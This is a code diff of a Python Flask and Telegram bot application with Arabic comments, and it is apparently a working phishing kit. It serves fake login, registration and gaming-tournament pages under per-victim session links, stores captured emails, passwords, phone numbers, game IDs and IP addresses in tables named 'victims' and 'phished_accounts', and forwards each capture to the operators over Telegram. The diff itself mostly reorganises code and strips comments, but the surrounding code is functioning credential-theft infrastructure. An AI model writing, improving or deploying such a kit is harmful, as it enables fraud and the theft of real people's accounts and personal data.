@@ -5,6 +5,7 @@ import sqlite3
 import secrets
 import threading
 import requests
+import asyncio
 from datetime import datetime
 from flask import Flask, request, render_template, redirect, jsonify
 from telegram import Bot
@@ -19,14 +20,14 @@ if not TELEGRAM_TOKEN:
     raise ValueError("TELEGRAM_TOKEN not set")
 
 # ========== Flask ==========
-app = Flask(__name__, template_folder='.')
+app = Flask(__name__, template_folder='templates')
+
 # ========== قاعدة البيانات ==========
 DB_PATH = "data.db"
 
 def init_db():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    # جدول الضحايا (بيانات البطولة)
     c.execute('''CREATE TABLE IF NOT EXISTS victims (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         session_id TEXT UNIQUE,
@@ -40,7 +41,6 @@ def init_db():
         user_agent TEXT,
         timestamp TEXT
     )''')
-    # جدول حسابات التصيد (بيانات تسجيل الدخول)
     c.execute('''CREATE TABLE IF NOT EXISTS phished_accounts (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         session_id TEXT,
@@ -53,6 +53,15 @@ def init_db():
     conn.commit()
     conn.close()
 
+def send_to_telegram(message):
+    try:
+        bot = Bot(token=TELEGRAM_TOKEN)
+        for admin_id in ADMIN_IDS:
+            bot.send_message(chat_id=admin_id, text=message, parse_mode='Markdown')
+        print(f"[✓] تم إرسال الرسالة: {message[:50]}...")
+    except Exception as e:
+        print(f"[!] خطأ في الإرسال: {e}")
+
 def save_victim(session_id, step, full_name, phone_code, phone_number, game_id, email, ip, ua):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
@@ -62,7 +71,6 @@ def save_victim(session_id, step, full_name, phone_code, phone_number, game_id, 
               (session_id, step, full_name, phone_code, phone_number, game_id, email, ip, ua, datetime.now().isoformat()))
     conn.commit()
     conn.close()
-    # إرسال البيانات فوراً للتيليجرام
     send_to_telegram(
         f"🎯 **بيانات البطولة!**\n"
         f"🆔 الجلسة: `{session_id}`\n"
@@ -93,14 +101,6 @@ def save_phished_account(session_id, email, password, ip, ua):
         f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}"
     )
 
-def send_to_telegram(message):
-    try:
-        bot = Bot(token=TELEGRAM_TOKEN)
-        for admin_id in ADMIN_IDS:
-            bot.send_message(chat_id=admin_id, text=message, parse_mode='Markdown')
-    except Exception as e:
-        print(f"[!] خطأ في الإرسال للتيليجرام: {e}")
-
 # ========== الصفحات ==========
 @app.route('/')
 def home():
@@ -110,7 +110,6 @@ def home():
 def health():
     return "OK", 200
 
-# صفحة تسجيل الدخول
 @app.route('/p/<session_id>', methods=['GET', 'POST'])
 def login_page(session_id):
     if request.method == 'POST':
@@ -119,11 +118,9 @@ def login_page(session_id):
         ip = request.remote_addr
         ua = request.headers.get('User-Agent', '')
         save_phished_account(session_id, email, password, ip, ua)
-        # توجيه إلى صفحة البطولة
         return redirect(f'/t/{session_id}')
     return render_template('login.html', session_id=session_id)
 
-# صفحة إنشاء حساب
 @app.route('/r/<session_id>', methods=['GET', 'POST'])
 def register_page(session_id):
     if request.method == 'POST':
@@ -132,7 +129,6 @@ def register_page(session_id):
         password = request.form.get('password', '').strip()
         ip = request.remote_addr
         ua = request.headers.get('User-Agent', '')
-        # تخزين بيانات الإنشاء
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
         c.execute('''INSERT INTO phished_accounts (session_id, email, password, ip, user_agent, timestamp)
@@ -153,7 +149,6 @@ def register_page(session_id):
         return redirect(f'/t/{session_id}')
     return render_template('register.html', session_id=session_id)
 
-# صفحة البطولة
 @app.route('/t/<session_id>', methods=['GET', 'POST'])
 def tournament_page(session_id):
     if request.method == 'POST':
@@ -182,7 +177,6 @@ def collect():
     save_victim(session_id, 'ajax', full_name, phone_code, phone_number, game_id, email, ip, ua)
     return jsonify({"status": "ok"})
 
-# ========== دوال البوت ==========
 # ========== دوال البوت ==========
 async def start(update, context):
     if update.effective_user.id not in ADMIN_IDS:
@@ -243,35 +237,24 @@ async def stats(update, context):
         parse_mode='Markdown'
     )
 
-# ========== بناء وتجهيز تطبيق البوت ==========
-# هنا نقوم بتعريف المتغير app_bot الذي كان مفقوداً وتثبيت المعالجات
+# ========== بناء البوت ==========
 app_bot = Application.builder().token(TELEGRAM_TOKEN).build()
 app_bot.add_handler(CommandHandler("start", start))
 app_bot.add_handler(CommandHandler("link", generate_link))
 app_bot.add_handler(CommandHandler("list", list_victims))
 app_bot.add_handler(CommandHandler("stats", stats))
 
-# ========== تشغيل البوت في خلفية منفصلة ==========
-import asyncio
-
 def run_bot():
-    # 1. إنشاء event loop جديد للثريد الحالي
     loop = asyncio.new_event_loop()
-    # 2. تعيين الـ loop الجديد كـ loop نشط في هذا الثريد
     asyncio.set_event_loop(loop)
-    
-    # 3. تشغيل البوت مع إيقاف إشارات النظام لمنع الكراش
     app_bot.run_polling(close_loop=False, stop_signals=False)
-
 
 # ========== المدخل الرئيسي ==========
 if __name__ == "__main__":
     init_db()
     
-    # تشغيل البوت في خيط منفصل
     bot_thread = threading.Thread(target=run_bot, daemon=True)
     bot_thread.start()
     
-    # تشغيل Flask
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
